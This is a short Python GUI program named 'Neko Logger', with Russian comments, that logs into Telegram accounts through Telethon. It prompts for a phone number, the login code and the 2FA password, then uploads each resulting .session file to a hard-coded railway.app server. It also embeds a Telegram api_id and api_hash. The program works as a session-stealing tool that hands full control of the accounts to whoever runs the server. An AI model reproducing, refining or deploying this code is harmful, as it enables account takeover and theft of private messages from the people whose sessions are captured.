import os
import requests
import tkinter as tk
from tkinter import messagebox, simpledialog
from telethon.sync import TelegramClient

# 🔥 ВСТАВЬ СЮДА СВОЙ URL
SERVER_URL = "gleaming-truth-production-ed48.up.railway.app"

# 🔥 ТВОИ API (вшиты)
api_id = 30074866
api_hash = "eea91e3c3b0381b36d455383fe5b9989"

sessions = []

# ➕ добавить аккаунт
def add_account():
    phone = simpledialog.askstring("Телефон", "Введите номер (+380...):")

    if not phone:
        return

    session_name = f"session_{phone}"

    client = TelegramClient(session_name, api_id, api_hash)

    try:
        client.connect()

        if not client.is_user_authorized():
            client.send_code_request(phone)
            code = simpledialog.askstring("Код", "Введите код из Telegram:")

            try:
                client.sign_in(phone, code)
            except:
                password = simpledialog.askstring("2FA", "Введите пароль:", show="*")
                client.sign_in(password=password)

        sessions.append(session_name)
        listbox.insert(tk.END, phone)

        messagebox.showinfo("Успех", f"Аккаунт {phone} добавлен")

    except Exception as e:
        messagebox.showerror("Ошибка", str(e))

    finally:
        client.disconnect()


# 📤 отправка всех сессий
def send_sessions():
    if not sessions:
        messagebox.showwarning("Ошибка", "Нет аккаунтов")
        return

    for session_name in sessions:
        file = session_name + ".session"

        if os.path.exists(file):
            try:
                with open(file, "rb") as f:
                    requests.post(SERVER_URL, files={"file": f})
            except:
                pass

    messagebox.showinfo("Готово", "Все сессии отправлены 🚀")


# 🖥 GUI
root = tk.Tk()
root.title("Neko Logger")
root.geometry("400x400")

label = tk.Label(root, text="Аккаунты:", font=("Arial", 12))
label.pack(pady=10)

listbox = tk.Listbox(root)
listbox.pack(fill="both", expand=True, padx=20)

btn_add = tk.Button(root, text="➕ Добавить аккаунт", command=add_account)
btn_add.pack(pady=5)

btn_send = tk.Button(root, text="📤 Отправить на сервер", command=send_sessions)
btn_send.pack(pady=5)

root.mainloop()